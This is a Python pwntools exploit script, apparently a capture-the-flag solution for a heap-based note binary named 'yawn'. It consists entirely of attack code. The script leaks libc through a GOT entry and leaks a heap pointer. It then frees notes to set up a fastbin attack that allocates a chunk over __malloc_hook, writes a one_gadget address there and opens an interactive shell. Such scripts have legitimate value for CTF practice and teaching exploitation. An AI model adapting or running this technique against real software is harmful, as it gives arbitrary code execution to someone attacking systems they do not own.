#!/usr/bin/env python 2.7
from pwn import *

r = process("./yawn", env = {'LD_PRELOAD':'./libc.so.6'})
#r = process('./yawn_patched')

#context.log_level = 'debug'


breakpoint = { 'add_note':0x400ae8, 'add1':0x400c0b, 'edit_note':0x400c88, 'remove_note':0x400e50, 'view_note':0x400f0a }


def add_note(name, desc):
	r.sendlineafter(">> ","1")
	r.sendafter("Enter name: ",name)
	r.sendafter("Enter desc: ",desc)

def view_note(idx):
	r.sendlineafter(">> ",'4')
	r.sendafter("Enter idx: ",idx)

def remove_note(idx):
	r.sendlineafter(">> ","3")
	r.sendafter('Enter idx: ',idx)

def edit_note(idx, name, size, desc):
	r.sendlineafter(">> ", '2')
	r.sendafter("Enter index: ",idx)
	r.sendafter("Enter name: ",name)
	r.sendafter("Enter size: ",size)
	r.sendafter("Enter desc: ",desc)


pause()

#### libc leak ####
add_note("A"*80, "0"*0x8 + p64(0x601fc0) + '\n')   # fgets@got leak 0x601fc0
view_note('0')

r.recvuntil("Description : ")
leak = u64(r.recv(6).ljust(8,'\x00'))
libc_base = leak - 449232

success("libc_base = {}".format(hex(libc_base)))

malloc_hook = libc_base + 3951376
success("malloc_hook = {}".format(hex(malloc_hook)))

#### heap leak ####
table = 0x602040

add_note("A"*80, '1'*8 + p64(table) + '\n')
view_note('1')

r.recvuntil("Description : ")
leak = u64(r.recvline()[:-1].ljust(8,'\x00'))
heap_table = leak

success('heap_table_start = {}'.format(hex(heap_table)))


#### exploit ####
add_note('A'*50 + '\n', '2'*8 + '\n')
add_note('A'*80, '3'*0x8 + p64(heap_table + 288) + '\n')
add_note('A'*50 + '\n', '4'*8 + '\n')


remove_note('2')
remove_note('4')
remove_note('3')


edit_note('0','A'*50 + '\n', str(100) + '\n', 'A'*(0x60-1) + '\n')

add_note(p64(libc_base + 3951341) + '\n', '5'*8 + '\n') # allocate &__malloc_hook + 35
add_note('A'*50 + '\n', '6'*8 + '\n')
add_note('A'*50 + '\n', '7'*8 + '\n')

one_gadget = libc_base + 0xf02a4
success('one_gadget = {}'.format(hex(one_gadget)))

add_note('A'*19 + p64(one_gadget) + '\n', '8'*8+'\n') # write malloc_hook

add_note('A' + '\n', 'A' + '\n')

# gdb.attach(r,'break {}'.format(breakpoint['view_note']))

# view_note('0')


r.interactive()


